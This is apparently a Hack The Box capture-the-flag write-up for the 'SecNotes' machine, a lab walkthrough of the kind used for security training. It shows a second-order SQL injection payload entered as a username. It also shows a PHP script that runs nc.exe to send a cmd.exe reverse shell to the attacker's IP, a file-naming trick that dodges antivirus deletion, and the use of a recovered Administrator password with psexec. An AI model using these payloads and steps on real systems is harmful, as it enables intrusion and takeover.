# SecNotes [HTB](https://app.hackthebox.com/machines/SecNotes)
![secnotes-01]()

## Recon

Lets scan the target with `nmap`:

`nmap -sC -sV -p- -A 10.129.102.215 -oN nmap.result`

![nmap-res-02]()

We have the following:

+ An IIS web server on ports 80 and 8808.
+ An SMB server on port 445.


We can see the server on port 80 is a login page as the requested resource was `login.php`.
We should take a look into it and see if we can break it, but maybe we can find credentials 
in the SMB first, perhaps its misconfigured. 


### SMB 445


Lets try gathering user inforamtion with a null session using `crackmapexec`.

`crackmapexec smb 10.129.102.215 -u '' -p '' --users`

![crackmapexec-null-fail-03]()


The target seems to be running Windows 10, null sessions are not allowed though. We wont get in
without credetials. Lets try the IPC$ share: 

`smbclient -U '%' -N \\\\10.129.102.215\\IPC$`


![smbclient-null-fail-04]()


Seems like the SMB is not the way forward at the moment. Lets take a look at the IIS server. 



### IIS 80 


Lets start by adding `secnotes.htb` to our `/etc/hosts` file:

![hosts-05]()


Lets open our browser and navigate towards `http://secnotes.htb/`:

![login-form-06]()


We are prompted for credentials, we also have a signup form. Lets try a few diffrent payloads for the login page. Maybe default credentials like `admin:admin`?, simple SQLi payloads like `' OR 1=1;--`: 

![login-fail-07]()


Maybe there is hidden content somewhere, lets try directory busting:

`ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3
-medium.txt:FUZZ -u http://http://secnotes.htb/FUZZ`

![ffuf-fail-08]()


This yielded nothing. lets try subdomain enumeration? 

`wfuzz -c -f sub-fighter -Z -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://secnotes.htb' -H 'Host: FUZZ.secnotes.htb' --hw 0`

![wfuzz-fail-09]()


We have zero leads at the moment. Lets create an account and see where this leads us.

![create-account-10]()


We get redirected to a home page: 

![home-page-11]()


I think the message at the top is a hint towards an indirect object reference vulnerability.
We also get a possible username on the machine in `tyler`.


Lets add a note:

![add-note-12]()

 
You are presented with the note in our home page, and we have a button to delete the note:

![del-note-13]()


It's a link to `/home.php?action=delete&id=11"`, we can see this more clearly in Burp:

![burp-14]()


But the `action` parameter is for `delete`, and we want to see other user's notes, 
not delete them. 

I've tried to hunt down a an IDOR vulenrability with diffrent arguments 
to both URL parameters, we either get a `200` or `302` repsonse with no meaningful progreess. 

I've created another account, trying to play around with the other user's notes, but that 
didnt lead anywhere. 

Then i decided to look for SQLi injection in the login form, i used a few manual payloads, 
as well as `sqlmap`, but that failed. 

Then i noticed that, the username we give when signing up, is displayed on our home page
quite frequatnly, and it seems that the target is using some sort of database to load these 
notes from based on their ID. So maybe the target is using our username to load our notes 
when we login. 

What if we create an account with an SQL statement as the username to load all notes in the 
database? for example `' OR 1 OR'`:

![malicios-login-15]()


Now when we login we can see all the notes in the database: 

![all-notes-16]()


Looks like credetials for an SMB share. Lets try them out:

![smb-conn-17]()


It looks like the root of the IIS server on port 8808, Can we write files to this share? 

![upload-test-18]()


Yes we can. Next logical step is to upload a reverse shell script. At first i tried `.aspx`,
but this failed with a `404`. So i tried PHP instead which did work, but i get disconnected 
every time after a few seconds, probably an AV. It also removes whatever we upload to the SMB.


After playing around with a few different reverse shell strategies, I've noticed that if
we name our files as `iisstart`, they wont get deleted regardless of the extension. 
Ive also noteiced that only `php` scripts properly execute from the URL. 

What we can do, is upload a Windows version of `nc`, create a PHP script that executes the `nc`
and connect to our attack machine. Maybe if the reverse shell comes from an `.exe` file the AV
wont crash it. 

The `nc.exe` on Kali is at `/usr/share/windows-resources/binaries/nc.exe`. 

I will rename it to `iisstart.exe` and put it on the SMB share:

![upload-nc-19]()


Now we need a `iisstart.php` script we can trigger via the URL that will execute the `nc`.

```php
<?php
system('iisstart.exe -e cmd.exe 10.10.14.68 9001')
?>
```


Put this on the SMB also: 

![upload-php-20]()


Start the listener `nc -lnvp 9001`. 

Navigate to `http://secnotes.htb:8808/iisstart.php`

And get a shell:

![shell-21]()



## Privilege Escalation

If we take a look at tyler's home directroy, we can see a `bash.lnk`:

![home-dir-22]()


We might have `wsl` on this machine. This is important because with root privileges `wsl` allows
users to create a bind shell on any port (no elevation needed).


Lets find the `bash` binary on the system:

`where /R c:\windows bash.exe`


![bash-location-23]()


Lets execute it, get into a shell, and use `python -c 'import pty; pty.spawn("/bin/sh")'` to 
spwan a TTY shell:

![bash-tty-24]()



If we simply run `history` to try and snatch quick wins: 

![history-25]()


Looks like the Administrator's password. Lets try `psexec`:

`impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.189.209`


![root-25]()
